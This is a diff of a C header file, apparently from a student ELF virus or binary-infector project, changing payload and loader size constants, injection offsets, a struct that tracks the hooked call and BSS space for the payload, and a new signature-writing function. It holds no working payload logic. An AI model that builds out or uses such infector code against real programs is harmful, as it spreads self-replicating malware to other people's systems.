@@ -12,35 +12,38 @@
 # include <fcntl.h>
 
 # define MAGIC_VIRUS 0x4E505241
+# define SIGN_SIZE 0x28
+
 # define BUF_SIZE 0x20
 # define END_SIZE 0x1B + 0x5
 # define LOADER_SIZE 0x43
-# define PAYLOAD_SIZE 0x1e7a - 0x11A0 + 0x7
-# define MAIN_OFFSET 0x1c60 - 0x11A0
+# define PAYLOAD_SIZE 0x1fcd - 0x11A0 + 0x7
+# define MAIN_OFFSET 0x1db3 - 0x11A0
+# define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x177b - 0x11a0
-# define OFFSET_2 0x18ac - 0x11a0
-# define OFFSET_3 0x19a4 - 0x11a0
+# define OFFSET_1 0x1896 - 0x11a0
+# define OFFSET_2 0x19c7 - 0x11a0
+# define OFFSET_3 0x1abf - 0x11a0
 
 typedef struct		s_info
 {
-	void		*file;
-	size_t		file_size;
-// 	void		*new_file;
-// 	size_t		new_file_size;
-	void		*text_begin;
-	size_t		text_size;
-	size_t		text_addr;
+    void		*file;
+    size_t		file_size;
+    // 	void		*new_file;
+    // 	size_t		new_file_size;
+    void		*text_begin;
+    size_t		text_size;
+    size_t		text_addr;
 
-	void		*addr_call_to_replace;
-	void		*addr_hooked_func;
+    void		*addr_call_to_replace;
+    void		*addr_hooked_func;
 
-	size_t		bss_size;
-	size_t		begin_bss;
-	size_t		offset_payload;
-	size_t		addr_payload;
+    size_t		bss_size;
+    size_t		begin_bss;
+    size_t		offset_payload;
+    size_t		addr_payload;
 
-	int32_t		 valid_target;
+    int32_t		 valid_target;
 }					t_info;
 
 void		loader();
@@ -51,7 +54,7 @@ void		woody();
 /*			**** FILL_BUFF ****					*/
 void		write_begin(char *buf);
 void		write_filename_src(char *buf);
-void		write_filename_dest(char *buf);
+void		write_sign(char *buf);
 
 /*			**** PARSING ****					*/
 int		find_text(t_info *info);
